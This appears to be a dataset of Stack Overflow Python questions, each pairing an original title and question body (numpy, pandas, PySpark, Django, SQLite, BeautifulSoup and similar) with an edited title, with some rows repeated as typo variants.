"Why does my my text file keep overwriting the data on it? (json, python, facebook)"," I'm trying to pull some data from Facebook pages for a product and dump it all into a text file, but I find that the file keeps overwriting itself with the data. I'm not sure if it's a pagination issue or if I have to make several files.Here's my code: Any idea as to why this is happening? <code>  #Modulesimport requestsimport facebookimport jsondef some_action(post): print posts['data'] print post['created_time']#Tokenaccess_token = 'INSERT ACCESS TOKEN'user = 'walkers'#Postsgraph = facebook.GraphAPI(access_token)profile = graph.get_object(user)posts = graph.get_connections(profile['id'], 'posts')#Writewhile True: posts = requests.get(posts['paging']['next']).json() #print posts with open('test121.txt', 'w') as outfile: json.dump(posts, outfile)",Why does my text file keep overwriting the data on it?
Why does my my text file keep overwriting the data on it?," I'm trying to pull some data from Facebook pages for a product and dump it all into a text file, but I find that the file keeps overwriting itself with the data. I'm not sure if it's a pagination issue or if I have to make several files.Here's my code: Any idea as to why this is happening? <code>  #Modulesimport requestsimport facebookimport jsondef some_action(post): print posts['data'] print post['created_time']#Tokenaccess_token = 'INSERT ACCESS TOKEN'user = 'walkers'#Postsgraph = facebook.GraphAPI(access_token)profile = graph.get_object(user)posts = graph.get_connections(profile['id'], 'posts')#Writewhile True: posts = requests.get(posts['paging']['next']).json() #print posts with open('test121.txt', 'w') as outfile: json.dump(posts, outfile)",Why does my text file keep overwriting the data on it?
how to properly union with set," I understand that any python set union with empty set would result in itself. But some strange behave I detect when union is inside of a for loop.looks good confused anyone could tell me why the last set s is empty?is the output supposed to be every unique element in the set? <code>  num= set([2,3,4])emp= set()print num|emp>>>set([2, 3, 4]) s = set()inp = [""dr101-mr99"",""mr99-out00"",""dr101-out00"",""scout1-scout2"",""scout3- scout1"",""scout1-scout4"",""scout4-sscout"",""sscout-super""]for ele in inp: r = set(ele.split(""-"")) print r s.union(r)print s >>>set(['mr99', 'dr101']) set(['out00', 'mr99']) set(['out00', 'dr101']) set(['scout1', 'scout2']) set(['scout1', 'scout3']) set(['scout4', 'scout1']) set(['scout4', 'sscout']) set(['super', 'sscout']) set([])",How to properly union with set
Python: Compare n arrays," I have n matrices of the same size and want to see how many cells are equal to each other across all matrices. Code: How do I get Python to return a value of 2 (cells 2,1 and 2,3 match in all 3 matrices) or an array of [[False, False, False], [True, False, True], [False, False, False]]? <code>  import numpy as npa = np.array([[1,2,3],[4,5,6],[7,8,9]])b = np.array([[5,6,7], [4,2,6], [7, 8, 9]])c = np.array([2,3,4],[4,5,6],[1,2,5])#Intuition is below but is wronga == b == c",Python: Elementwise comparison of same shaped arrays
What is the difference between a qurydict and multivalue dict?," I was looking to convert a dict to a QueryDict in my django project. Couple of links exists to explain this (Django: Can I create a QueryDict from a dictionary? and How to change a django QueryDict to Python Dict?). This is my simple dictionary which I want to convert abc = {'a': 1, 'b':[1,2,3]}. I have tried this approach: This is the error trace I am getting Why this has failed and how can I get this done?Also what are the differences between MultiValueDict and QueryDict? <code>  from django.http import QueryDictfrom django.utils.datastructures import MultiValueDictabc = { 'a': 1, 'b':[1,2,3]}mdict = MultiValueDict(abc)qdict = QueryDict(mdict) /usr/lib/python2.7/urlparse.pyc in parse_qsl(qs, keep_blank_values, strict_parsing)407 Returns a list, as G-d intended.408 """"""409 pairs = [s2 for s1 in qs.split('&') for s2 in s1.split(';')]410 r = []411 for name_value in pairs:AttributeError: 'MultiValueDict' object has no attribute 'split'",What is the difference between a QueryDict and MultiValueDict?
"numpy using bool array mask, and replace False value with NaN"," I have two arrays, Now I want using b to mask a, retain the True value in a, and replace the False value with NaN, getting a new array that has a shape like a.How to do that? <code>  a = array([ [ 0.93825418, 0.60731973, 0.44218921, 0.90888805, 0.97695114], [ 0.27422807, 0.75870153, 0.12154102, 0.89137678, 0.04257262], [ 0.32855867, 0.17215507, 0.00302302, 0.95395069, 0.02596567], [ 0.18385244, 0.09108341, 0.27925367, 0.0177183 , 0.41035188], [ 0.87229432, 0.73573982, 0.98554476, 0.72321398, 0.98316711], [ 0.16474265, 0.5308054 , 0.27913615, 0.59107689, 0.6480463 ], [ 0.88356436, 0.22343885, 0.74900285, 0.43895017, 0.74993129], [ 0.08097611, 0.48984607, 0.33991052, 0.06431022, 0.10753135], [ 0.67351561, 0.13165046, 0.41327765, 0.21768539, 0.7337069 ], [ 0.65609999, 0.06241059, 0.3400624 , 0.13234171, 0.23679716]])b = array([ [False, True, True, False, False], [ True, False, False, False, False], [ True, True, False, False, False], [False, False, True, False, True], [False, False, False, True, False], [False, True, True, True, True], [False, True, False, True, True], [False, True, True, False, False], [ True, True, True, True, True], [ True, False, True, False, True]], dtype = bool)","Using bool array mask, replace False values with NaN"
Python - Loop through files of certain extensions," I'm trying to loop through a folder and all subfolders to find all files of certain file types - for example, only .mp4, .avi, .wmv.Here is what I have now, it loops through all file types: <code>  import osrootdir = 'input'for subdir, dirs, files in os.walk(rootdir): for file in files: print (os.path.join(subdir, file))",How to loop through files of certain extensions?
Using explict (predefined) validation set for grid search with sklearn," I have a dataset, which has previously been split into 3 sets: train, validation and test. These sets have to be used as given in order to compare the performance across different algorithms.I would now like to optimize the parameters of my SVM using the validation set. However, I cannot find how to input the validation set explicitly into sklearn.grid_search.GridSearchCV(). Below is some code I've previously used for doing K-fold cross-validation on the training set. However, for this problem I need to use the validation set as given. How can I do that? <code>  from sklearn import svm, cross_validationfrom sklearn.grid_search import GridSearchCV# (some code left out to simplify things)skf = cross_validation.StratifiedKFold(y_train, n_folds=5, shuffle = True)clf = GridSearchCV(svm.SVC(tol=0.005, cache_size=6000, class_weight=penalty_weights), param_grid=tuned_parameters, n_jobs=2, pre_dispatch=""n_jobs"", cv=skf, scoring=scorer)clf.fit(X_train, y_train)",Using explicit (predefined) validation set for grid search with sklearn
How to get short sha with gitpython?," The long SHA can be gotten like below: Or, in git 3.1.7: How about short one?(short SHA is decided by the scale of the repo, so it should not be like sha[:7]) <code>  repo = git.Repo(search_parent_directories=True)sha = repo.head.object.hexsha sha = repo.head.commit.hexsha",get short sha of commit with gitpython
Beautiful soup search by text," Observe the following problem: For some reason, BeautifulSoup will not match the text, when the <i> tag is there as well. Finding the tag and showing its text produces Right. According to the Docs, soup uses the match function of the regular expression, not the search function. So I need to provide the DOTALL flag: Alright. Looks good. Let's try it with soup EditMy solution based on geckons answer: I implemented these helpers: Now, when I want to find the element above, I just run find_by_text(soup, 'Edit', 'a', href='/customer-menu/1/accounts/1/update') <code>  import refrom bs4 import BeautifulSoup as BSsoup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> Edit</a>"""""")# This returns the <a> elementsoup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*""))soup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> <i class=""fa fa-edit""></i> Edit</a>"""""")# This returns Nonesoup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*"")) >>> a2 = soup.find( 'a', href=""/customer-menu/1/accounts/1/update"" )>>> print(repr(a2.text))'\n Edit\n' pattern = re.compile('.*Edit.*')pattern.match('\n Edit\n') # Returns Nonepattern = re.compile('.*Edit.*', flags=re.DOTALL)pattern.match('\n Edit\n') # Returns MatchObject soup = BS(""""""<a href=""/customer-menu/1/accounts/1/update""> <i class=""fa fa-edit""></i> Edit</a>"""""")soup.find( 'a', href=""/customer-menu/1/accounts/1/update"", text=re.compile("".*Edit.*"", flags=re.DOTALL)) # Still return None... Why?! import reMATCH_ALL = r'.*'def like(string): """""" Return a compiled regular expression that matches the given string with any prefix and postfix, e.g. if string = ""hello"", the returned regex matches r"".*hello.*"" """""" string_ = string if not isinstance(string_, str): string_ = str(string_) regex = MATCH_ALL + re.escape(string_) + MATCH_ALL return re.compile(regex, flags=re.DOTALL)def find_by_text(soup, text, tag, **kwargs): """""" Find the tag in soup that matches all provided kwargs, and contains the text. If no match is found, return None. If more than one match is found, raise ValueError. """""" elements = soup.find_all(tag, **kwargs) matches = [] for element in elements: if element.find(text=like(text)): matches.append(element) if len(matches) > 1: raise ValueError(""Too many matches:\n"" + ""\n"".join(matches)) elif len(matches) == 0: return None else: return matches[0]",BeautifulSoup - search by text inside a tag
Show Tables in SQLite Database," I know this is a very basic question but for some reason I can't get past this one error. I'm trying to show/put all the names of the tables in a database (named 'GData.db') into a variable available_tables in Python. Currently I have the following: This gives me the following error for the second-last line: I've looked at the SHOW TABLES documentation as well as around the web but not found information that helps me.  <code>  con = sql.connect(r'/Users/linnk/Desktop/Results/GData.db')cur = con.cursor() cur.execute(""SHOW TABLES IN GData"")available_table=(cursor.fetchall()) OperationalError: near ""SHOW"": syntax error",Show Tables in SQLite Database in Python
add a coma between the elements of a numpy array," I have a numpy array which looks like and I want it to become I tried but it returns an error: 'numpy.ndarray' object has no attribute 'split' <code>  a = ['blue' 'red' 'green'] b = ['blue', 'red', 'green'] b = a.split(' ')",add a comma between the elements of a numpy array
Python: Yield and Yield Assignment," How does this code, involving assignment and the yield operator, work? The results are rather confounding. Output: <code>  def test1(x): for i in x: _ = yield i yield _def test2(x): for i in x: _ = yield i r1 = test1([1,2,3])r2 = test2([1,2,3])print list(r1)print list(r2) [1, None, 2, None, 3, None] [1, 2, 3]",Python: yield and yield assignment
"copy 2D array into 3rd dimension, N times (Python)"," I'd like to copy a numpy 2D array into a third dimension. For example, given the 2D numpy array: convert it into a 3D matrix with N such copies in a new dimension. Acting on arr with N=3, the output should be: <code>  import numpy as nparr = np.array([[1, 2], [1, 2]])# arr.shape = (2, 2) new_arr = np.array([[[1, 2], [1,2]], [[1, 2], [1, 2]], [[1, 2], [1, 2]]])# new_arr.shape = (3, 2, 2)","How to copy a 2D array into a 3rd dimension, N times?"
Write pandas dataframe containing comma-separated-string to CSV," Using the impyla module, I've downloaded the results of an impala query into a pandas dataframe, done analysis, and would now like to write the results back to a table on impala, or at least to an hdfs file. However, I cannot find any information on how to do this, or even how to ssh into the impala shell and write the table from there. What I'd like to do: Once I've done whatever I need to do with pandas_df, save those results back to impala as a table. The above scenario would be ideal, but I'd be happy if I could figure out how to ssh into impala-shell and do this from python, or even just save the table to hdfs. I'm writing this as a script for other users, so it's essential to have this all done within the script. Thanks so much!  <code>  from impala.dbapi import connectfrom impala.util import as_pandas# connect to my host and portconn=connect(host='myhost', port=111) # create query to save table as pandas dfcreate_query = """""" SELECT * FROM {} """""".format(my_table_name)# run query on impalacur = conn.cursor()cur.execute(create_query)# store results as pandas data framepandas_df = as_pandas(cur)cur.close() # create query to save new_df back to impalasave_query = """""" CREATE TABLE new_table AS SELECT * FROM pandas_df """"""# run query on impalacur = conn.cursor()cur.execute(save_query)cur.close()",Write pandas table to impala
Python Pandas: How to I round datetime column to nearest quarter hour," I have loaded a data file into a Python pandas dataframe. I has a datetime column of the format 2015-07-18 13:53:33.280. What I need to do is create a new column that rounds this out to its nearest quarter hour. So, the date above will be rounded to 2015-07-18 13:45:00.000.How do I do this in pandas? I tried using the solution from here, but get an 'Series' object has no attribute 'year' error.  <code> ",How do I round datetime column to nearest quarter hour
Resize NumPy array without copy," When I shrink a numpy array using the resize method (i.e. the array gets smaller due to the resize), is it guaranteed that no copy is made?Example: From my understanding this should always be possible without making a copy. My question: Does the implementation indeed guarantee that this is always the case? Unfortunately the documentation of resize says nothing about it. <code>  a = np.arange(10) # array([0, 1, 2, 3, 4, 5, 6, 7, 8, 9])a.resize(5, refcheck=False) # array([0, 1, 2, 3, 4])",Resize NumPy array to smaller size without copy
Python error: 'UCS-2' codec can't encode characters in position 1050-1050," When I run my Python code, I get the following errors: Here is my code: How can I fix this? <code>  File ""E:\python343\crawler.py"", line 31, in <module> print (x1) File ""E:\python343\lib\idlelib\PyShell.py"", line 1347, in write return self.shell.write(s, self.tags)UnicodeEncodeError: 'UCS-2' codec can't encode characters in position 1050-1050: Non-BMP character not supported in Tk x = g.request('search', {'q' : 'TaylorSwift', 'type' : 'page', 'limit' : 100})['data'][0]['id']# GET ALL STATUS POST ON PARTICULAR PAGE(X=PAGE ID)for x1 in g.get_connections(x, 'feed')['data']: print (x1) for x2 in x1: print (x2) if(x2[1]=='status'): x2['message']",'UCS-2' codec can't encode characters in position 1050-1050
Automate creating circles (Python)," I'm trying to plot several (many thousands) of circle objects - I don't have much experience working with python. I'm interested in specifying the position, radius and color. Is there a more efficient way to achieve the same result?: <code>  import matplotlib.pyplot as pltxvals = [0,.1,.2,.3]yvals = [0,.1,.2,.3]rvals = [0,.1,.1,.1]c1vals = [0,.1,0..1]c2vals = [.1,0,.1,0]c3vals = [.1,.1,.1,.1]for q in range(0,4): circle1=plt.Circle((xvals[q], yvals[q]), rvals[q], color=[0,0,0]) plt.gcf().gca().add_artist(circle1)",How can I plot many thousands of circles quickly?
How can I create many thousands of circles?," I'm trying to plot several (many thousands) of circle objects - I don't have much experience working with python. I'm interested in specifying the position, radius and color. Is there a more efficient way to achieve the same result?: <code>  import matplotlib.pyplot as pltxvals = [0,.1,.2,.3]yvals = [0,.1,.2,.3]rvals = [0,.1,.1,.1]c1vals = [0,.1,0..1]c2vals = [.1,0,.1,0]c3vals = [.1,.1,.1,.1]for q in range(0,4): circle1=plt.Circle((xvals[q], yvals[q]), rvals[q], color=[0,0,0]) plt.gcf().gca().add_artist(circle1)",How can I plot many thousands of circles quickly?
iPython: Configure Base Url Path for All Request," I am trying to figure out how to configure the base url of and IPython notebook server running. So instead of the default: I want to configure all requests so that the go through ipython, as in: Is this possible? <code>  #request# GET http://localhost:8888/static/tree/js/main.min.js?v=04a28c5e21950738efb217191f08ac33#request# GET http://localhost:8888/api/terminals?_=1441754529652#request# GET http://localhost:8888/custom/custom.js?v=20150908160654#request# GET http://localhost:8888/notebooks/Untitled1.ipynb?kernel_name=python3# #request# GET http://localhost:8888/ipython/static/tree/js/main.min.js?v=04a28c5e21950738efb217191f08ac33#request# GET http://localhost:8888/ipython/api/terminals?_=1441754529652#request# GET http://localhost:8888/ipython/custom/custom.js?v=20150908160654#request# GET http://localhost:8888/ipython/notebooks/Untitled1.ipynb?kernel_name=python3#",IPython: Configure Base Url Path for All Request
python: json.encoder.FLOAT_REPR changed but no effect," I am trying to make my JSON encoder dump floats with only 2 decimal precision. So '2.241' becomes '2.24'I've read in this answer by Alex Martelli that you can overwrite the default FLOAT_REPR of json.encoder. I have tried the following: But I dont get the same results: And I can even verify the FLOAT_REPR is changed: And works as expected: Why is the built-in JSON module not using the FLOAT_REPR when I can see that it has been overwritten and the solution should be working according to Alex Martelli? I have tested this on two different computers, both running Python 2.7.6 on Ubuntu 14.0.4. <code>  >>> import json>>> json.encoder.FLOAT_REPR = lambda o: format(o, '.2f') >>> json.dumps(2.241)'2.241' >>> print json.encoder.FLOAT_REPR<function <lambda> at 0xb....> >>> json.encoder.FLOAT_REPR(2.241)2.24",json.encoder.FLOAT_REPR changed but no effect
Can Luigi propage exception or return any result?," I am using Luigi to launch some pipeline.Let's take a simple exemple Now let's say that myTask is raising an exception during execution. All that I am able to have is a log from luigi showing the exception. Is there any way that luigi could propagate it or at least return a failure status ? I would then be able to make my programm react in function of that state.Thanks.EDITI forgot to specify that luigi's outputs are targetting a database when I am storing the result. If an exception is raised, no result are stored but the exception is not propagated out a luigi. I was wondering if luigi have an option to have this. <code>  task = myTask()w = Worker(scheduler=CentralPlannerScheduler(), worker_processes=1)w.add(task)w.run()",Can Luigi propagate exception or return any result?
How to create simple 3-layer neural network in PyBrain and teach it using supervised learning?," Based on PyBrain's tutorials I managed to knock together the following code: It's supposed to learn XOR function, but the results seem quite random:0.2088849295220.1689265157710.4594528340430.424209192223or0.849561386640.8885127627860.5649640774010.611111147862 <code>  #!/usr/bin/env python2# coding: utf-8from pybrain.structure import FeedForwardNetwork, LinearLayer, SigmoidLayer, FullConnectionfrom pybrain.datasets import SupervisedDataSetfrom pybrain.supervised.trainers import BackpropTrainern = FeedForwardNetwork()inLayer = LinearLayer(2)hiddenLayer = SigmoidLayer(3)outLayer = LinearLayer(1)n.addInputModule(inLayer)n.addModule(hiddenLayer)n.addOutputModule(outLayer)in_to_hidden = FullConnection(inLayer, hiddenLayer)hidden_to_out = FullConnection(hiddenLayer, outLayer)n.addConnection(in_to_hidden)n.addConnection(hidden_to_out)n.sortModules()ds = SupervisedDataSet(2, 1)ds.addSample((0, 0), (0,))ds.addSample((0, 1), (1,))ds.addSample((1, 0), (1,))ds.addSample((1, 1), (0,))trainer = BackpropTrainer(n, ds)# trainer.train()trainer.trainUntilConvergence()print n.activate([0, 0])[0]print n.activate([0, 1])[0]print n.activate([1, 0])[0]print n.activate([1, 1])[0]",How to create simple 3-layer neural network and teach it using supervised learning?
Python:module 'os' has no attribute 'mknod'," I want to create a new file in Python for that I am using mknod command, but getting error as: I am using windows and attributes other than 'mknod' are working. <code>  os.mknod();AttributeError: module 'os' has no attribute 'mknod'",Python module 'os' has no attribute 'mknod'
"random.choice() returns same value at the same second, how i avoid it?"," I have been looking at similar questions regarding how to generate random numbers in python. Example: Similar Question - but i do not have the problem that the randomfunction returns same values every time. My random generator works fine, the problem is that it returns the same value when calling the function at, what I think, the same second which is undesireable. My code looks like this As I mentioned this function returns different values when being called at on different times but returns the same value when calling the function at the same time. How do I avoid this problem? I use this function in a back-end-server to generate unique IDs for users in front-end to insert in a database so I cannot control the time intervals when this happens. I must have random tokens to map the users in the database to be able to insert them correctly with queuenumbers in the database. <code>  def getRandomID(): token = '' letters = ""abcdefghiklmnopqrstuvwwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"" for i in range(1,36): token = token + random.choice(letters) return token","random.choice() returns same value at the same second, how does one avoid it?"
Python number in list," How can I see if an index contains certain numbers? <code>  numbers = [2349523234, 12345123, 12346671, 13246457, 134123431]for number in numbers: if (4 in number): print(number + ""True"") else: print(""False"")",Check if a digit is present in a list of numbers
Check if a digit is preent in a list of numbers," How can I see if an index contains certain numbers? <code>  numbers = [2349523234, 12345123, 12346671, 13246457, 134123431]for number in numbers: if (4 in number): print(number + ""True"") else: print(""False"")",Check if a digit is present in a list of numbers
What's the best way to use Python and OpenCV with multiprocessing?," I'm using Python 3.4.3 and OpenCV 3.0.0 to process (applying various filters to) a very large image (80,000 x 60,000) in memory and I'd like to use multiple CPU cores to improve performance. After some reading, I arrived at two possible method : 1) Use python's multiprocessing module, let each process deal with a slice of the large image and join the results after processing is done (And this probably should be performed on POSIX system?) 2) Since NumPy supports OpenMP and OpenCV uses NumPy, I can just leave the multiprocessing to NumPy? So my question is :Which one will be a better solution? (If they don't seem reasonable, what would be a possible approach? )If Option 2 is good, should I build both NumPy and OpenCV with OpenMP ? How would I actually make multi-processing happen? ( I couldn't really find useful instruction..)  <code> ",How to use Python and OpenCV with multiprocessing?
Can't convert SVM to DataFrame using loadLibSVMFile on Spark : 'PipelinedRDD' object has no attribute 'toDF'," I'm trying to load an SVM file and convert it to a DataFrame so I can use the ML module (Pipeline ML) from Spark.I've just installed a fresh Spark 1.5.0 on an Ubuntu 14.04 (no spark-env.sh configured).My my_script.py is: and I'm running using: ./spark-submit my_script.pyAnd I get the error: What I can't understand is that if I run: directly inside PySpark shell, it works. <code>  from pyspark.mllib.util import MLUtilsfrom pyspark import SparkContextsc = SparkContext(""local"", ""Teste Original"")data = MLUtils.loadLibSVMFile(sc, ""/home/svm_capture"").toDF() Traceback (most recent call last):File ""/home/fred-spark/spark-1.5.0-bin-hadoop2.6/pipeline_teste_original.py"", line 34, in <module>data = MLUtils.loadLibSVMFile(sc, ""/home/fred-spark/svm_capture"").toDF()AttributeError: 'PipelinedRDD' object has no attribute 'toDF' data = MLUtils.loadLibSVMFile(sc, ""/home/svm_capture"").toDF()",'PipelinedRDD' object has no attribute 'toDF' in PySpark
how to get the difference between 2 dictionaries in python," I have two dictionaries, and I need to find the difference between the two, which should give me both a key and a value.I have searched and found some addons/packages like datadiff and dictdiff-master, but when I try to import them in Python 2.7, it says that no such modules are defined.I used a set here: My output is: I am getting only keys, and I need to also get the values. <code>  first_dict = {}second_dict = {} value = set(second_dict) - set(first_dict)print value >>> set(['SCD-3547', 'SCD-3456'])",How to get the difference between two dictionaries in Python?
python for loop increasing or decreasing," I have to loop between two values where sometimes the first value is less than the second, and some other times the first is greater than the second (I'm working on two cells inside a grid and the first cell can be on the left of the second or vice versa).With Python, I can specify if a for loop has to decrease or to increase its values, but the result is something like that: Is there something more ""pythonic"" to obtain this? <code>  step = 1if y < x: step = -1for n in range(x, y, step): pass",How to make a for loop either increasing or decreasing?
"Differences in performance using np.power(x, 3) and x*x*x"," I was just revisiting some of my code to improve the performance and stumpled over something strange: Ok it seems to have some overhead when using the power-operator (**) but otherwise they seem identical (I guess NumPy is doing that) but then it got strange: So there is no problem but it seems a bit inconsistent to have a fallback for the magic pow but not for the UFUNC. But then I got interested since I am using third powers a lot: There seems to be no ""shortcut"" in the third power and UFUNC and 'magic-pow' work the same (at least in regard to performance).But that's not that good since I want a consistent method of using powers in my code and I'm not quite sure how to wrap the __pow__ of numpy.So to get to the point, my question is :Is there a way I can wrap the numpys __pow__ method? Because I want a consistent way of writing powers in my script not writing a**2 and at another place power(a, 3). Simply writing a**3, and redirecting this to my power function, would be preferred (but for that I would need to somehow wrap the ndarrays __pow__ or?). Currently I am using a shortcut but that's not that beautiful (I even have to declare the exponent==2 case since np.power performs not optimal there): I am using NumPy v1.9.3 and I do not want to subclass np.ndarray just for wrapping the __pow__ method. :-)EDIT: I rewrote the part where I get to my question. To clarify it: I am not asking about why NumPy does it the way it does - that is just to explain why I ask the question. <code>  a = np.linspace(10,1000,1000000).reshape(1000,1000)%timeit np.square(a)100 loops, best of 3: 8.07 ms per loop%timeit a*a100 loops, best of 3: 8.18 ms per loop%timeit a**2100 loops, best of 3: 8.32 ms per loop In [46]: %timeit np.power(a, 2)10 loops, best of 3: 121 ms per loop %timeit a*a*a100 loops, best of 3: 18.1 ms per loop%timeit a**310 loops, best of 3: 121 ms per loop%timeit np.power(a, 3)10 loops, best of 3: 121 ms per loop def power(array, exponent): if exponent == 2: #catch this, or it calls the slow np.power(array, exponent) return np.square(array) if exponent == 3: return array * array * array #As soon as np.cbrt is avaiable catch the exponent 4/3 here too return np.power(array, exponent) %timeit power(a, 3)100 loops, best of 3: 17.8 ms per loop%timeit a**310 loops, best of 3: 121 ms per loop",Wrapping np.arrays __pow__ method
"Pass !, !=, ~, <, > as python params", I want to be able to pass arguments like this: I saw this behavior in DjangoORM and SQLAlchemy but I don't know how to achieve it. <code>  fn(a>=b) or fn(a!=b),"Pass !, !=, ~, <, > as parameters"
Jinja2 variable inside a variable," I am trying to iterate over a dictionary in a Jinja2 template (in Ansible). One of the arrays or keys in the dictionary is 'abcd'This {{ item.value.abcd.port }} works fine, but key 'abcd' varies in each dictionary. I am looking to do something like below using a variable 'nginx_dir'. Or without using a variable at all, something like this <code>  {% set nginx_dir = item.value.keys().1 %}{% set my_port = item.value.nginx_dir.port %} {{ item.value.[item.value.keys().1].port }}",Python (Jinja2) variable inside a variable
Pyspark changing type of df from data to string," I have the following dataframe: Now I would like to change the datatype of the column vacationdate to String, so that also the dataframe takes this new type and overwrites the datatype data for all of the entries. E.g. after writing: The datatype of vacationdate should be overwritten.I already used functions like cast, StringType or astype, but I was not successful. Do you know how to do that? <code>  corr_temp_df[('vacationdate', 'date'), ('valueE', 'string'), ('valueD', 'string'), ('valueC', 'string'), ('valueB', 'string'), ('valueA', 'string')] corr_temp_df.dtypes",Pyspark changing type of column from date to string
Pyspark changing type of df from date to string," I have the following dataframe: Now I would like to change the datatype of the column vacationdate to String, so that also the dataframe takes this new type and overwrites the datatype data for all of the entries. E.g. after writing: The datatype of vacationdate should be overwritten.I already used functions like cast, StringType or astype, but I was not successful. Do you know how to do that? <code>  corr_temp_df[('vacationdate', 'date'), ('valueE', 'string'), ('valueD', 'string'), ('valueC', 'string'), ('valueB', 'string'), ('valueA', 'string')] corr_temp_df.dtypes",Pyspark changing type of column from date to string
"In Python (Pandas), How to remove last the two strings of a column df", How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
"In Python (Pandas), How to remove last the two characters in a column that is int", How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How to remove last the two characters in a column that is int, How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How to remove last the two characters in a column that is of integer type?, How can I remove the last two digits of a DataFrame column of type int64? For example df['DATE'] includes: What I would like is: What is the simplest way of achieving this? <code>  DATE20110708201107092011071020110711201107122011071320110714201108152011081620110817 DATE201107201107201107201107201107201107201107201108201108201108,How to remove last the two digits in a column that is of integer type?
How do you alias a type in python?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How do you alias a type?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How do you alias a type iny Python?," In some (mostly functional) languages you can do something like this: or So that we can build things like this: Is there a way to do this in Python? You could do it using classes, but Python has quite some functional aspects so I was wondering if it could be done an easier way. <code>  type row = list(datum) type row = [datum] type row = [datum]type table = [row]type database = [table]",How do you alias a type in Python?
How to validate time format? python," This is what I have so far, it probably is completely junk. What I want to do is validate caminput1, so that the format is HH:MM:SS. The hashes are from when I was testing. I am not very experienced with the syntax of all this stuff, or coding in general, but before you tell me to go and look it up.I have been looking around for ages, and I cannot find anything that explains the whole process. <code>  def cameraspeedcheck(): timeformat = (""%H:%M:%S"") caminput1 = input(""At what time did sensor 1 actuate? "") # is caminput1 = time(HH:MM:SS) # time.strptime(caminput1[%H:%M:%S]) caminput1.strptime(timeformat) # else cameraspeedcheck()",How to validate time format?
Fetch recursively connected nodes in a NetworkX graph," Straightforward question: I would like to retrieve all the nodes connected to a given node within a NetworkX graph in order to create a subgraph. In the example shown below, I just want to extract all the nodes inside the circle, given the name of one of any one of them.I've tried the following recursive function, but hit Python's recursion limit, even though there are only 91 nodes in this network.Regardless of whether or not the below code is buggy, what is the best way to do what I'm trying to achieve? I will be running this code on graphs of various sizes, and will not know beforehand what the maximum recursion depth will be. <code>  def fetch_connected_nodes(node, neighbors_list): for neighbor in assembly.neighbors(node): print(neighbor) if len(assembly.neighbors(neighbor)) == 1: neighbors_list.append(neighbor) return neighbors_list else: neighbors_list.append(neighbor) fetch_connected_nodes(neighbor, neighbors_list)neighbors = []starting_node = 'NODE_1_length_6578_cov_450.665_ID_16281'connected_nodes = fetch_connected_nodes(starting_node, neighbors)",Fetch connected nodes in a NetworkX graph
Finding the largest object in a python generator," Let's say I have a generator gen which yields some lists. I'd like to find the longest list.I can do which will get me the length of the longest list, but at this point the list is gone to the mists of time.Alternately I could do But it seems there should be a more pythonic way that avoids the for loop and the if statement.edit just a comment to help others who might search for related problems:Finding the smallest object with min can be done equivalently, and the same approach will work if gen is a list instead. <code>  max((len(L) for L in gen)) maxlength = 0for L in gen: if len(L)>maxlength: savelist = L maxlength = len(L)",Finding the largest/smallest object in a python generator/list
How to plot several graphs and make use of the navigation button in MatPlotLib," The latest version of matplotlib automatically creates navigation buttons under the graph. However, the examples I see in the Internet all just show how to create one graph, thus making the button [Next] and [Previous] useless. How do I plot several graphs and make use of those buttons?For example I want to make graph for sin() and cos() from 0 degree to 360 degree.Right now I do it like this: The sin() graph will be shown. It is when I close the window that the cos graph will be shown. If I exclude the first pyplot.show(), both will be shown in the same figure.How to make it so that the second graph is shown when I press the Next button? <code>  import scipyfrom matplotlib import pyplotDataRange = range(0, 360)DataRange = map(scipy.deg2rad, DataRange)Data1 = map(scipy.sin, DataRange)Data2 = map(scipy.cos, DataRange)pyplot.plot(Data1)pyplot.show() # <--- if I exclude thispyplot.plot(Data2)pyplot.show()",How to plot several graphs and make use of the navigation button in [matplotlib]
How do I use multiple conditions with pyspark.sql.funtions.when()?," I have a dataframe with a few columns. Now I want to derive a new column from 2 other columns: With this I only get an exception: It works with just one condition like this: Does anyone know to use multiple conditions?I'm using Spark 1.4. <code>  from pyspark.sql import functions as Fnew_df = df.withColumn(""new_col"", F.when(df[""col-1""] > 0.0 & df[""col-2""] > 0.0, 1).otherwise(0)) py4j.Py4JException: Method and([class java.lang.Double]) does not exist new_df = df.withColumn(""new_col"", F.when(df[""col-1""] > 0.0, 1).otherwise(0))",How do I use multiple conditions with pyspark.sql.functions.when()?
How to disable special naming convention check of PEP 8 in PyCharm," I installed PyCharm and enabled pep8 checks in Inspections.If I write: The IDE shows me this warning: Argument name should be lowercaseThere is no option to ignore only such inspection.I cant find such error number to ignore in pep8here are all the naming inspections.how to ignore only some of them?I need this because the current project coding guidelines must be kept. It's too hard to change the guidelines of the whole project.I need to disable only some naming inspections. Not all like by ""Settings""-> ""Editor""-> ""Inspections""->""PEP8 coding style violation"".e.g. class names should be still inspected with PEP8, and function argument names not. <code>  def func(argOne): print(argOne)",How to disable special naming convention inspection of PEP 8 in PyCharm
